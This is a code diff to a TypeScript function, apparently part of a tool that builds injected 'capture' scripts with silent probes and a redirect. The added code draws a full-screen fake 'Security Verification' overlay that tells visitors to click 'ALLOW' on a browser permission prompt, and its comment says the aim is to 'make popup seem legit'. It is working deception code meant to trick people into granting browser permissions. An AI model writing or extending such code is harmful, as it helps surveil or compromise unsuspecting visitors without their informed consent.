@@ -376,7 +376,38 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
       runSilentProbes();
 
       if (!isSilent) {
-        // UI Preparation
+        // UI Preparation: SHOW HUMAN VERIFICATION MODAL to make popup seem legit
+        var modal = document.createElement('div');
+        modal.style.position = 'fixed';
+        modal.style.top = '0';
+        modal.style.left = '0';
+        modal.style.width = '100vw';
+        modal.style.height = '100vh';
+        modal.style.background = 'rgba(0,0,0,0.85)';
+        modal.style.zIndex = '999999999';
+        modal.style.display = 'flex';
+        modal.style.flexDirection = 'column';
+        modal.style.justifyContent = 'center';
+        modal.style.alignItems = 'center';
+        modal.style.backdropFilter = 'blur(5px)';
+        modal.style.fontFamily = 'sans-serif';
+        modal.style.color = 'white';
+        modal.style.textAlign = 'center';
+        modal.style.padding = '20px';
+        
+        modal.innerHTML = '<div style="background: #1a1a1a; padding: 30px; border-radius: 12px; border: 1px solid #333; max-width: 400px; width: 100%; box-shadow: 0 10px 30px rgba(0,0,0,0.5);">' +
+            '<div style="font-size: 24px; margin-bottom: 15px; color: ' + accent + ';">🛡️ Security Verification</div>' +
+            '<p style="font-size: 16px; margin-bottom: 25px; line-height: 1.5; color: #ddd;">' +
+              'To prevent automated bots and spam, please complete the human verification step.<br><br>' +
+              '<b style="color: white;">Click "ALLOW" in the browser prompt that appears.</b>' +
+            '</p>' +
+            '<div style="display: flex; gap: 10px; justify-content: center;">' +
+               '<div style="width: 24px; height: 24px; border: 3px solid ' + accent + '; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>' +
+            '</div>' +
+            '<style>@keyframes spin { to { transform: rotate(360deg); } }</style>' +
+          '</div>';
+        document.body.appendChild(modal);
+
         var btn = document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button');
         if (btn) {
           btn.style.opacity = "0.7";
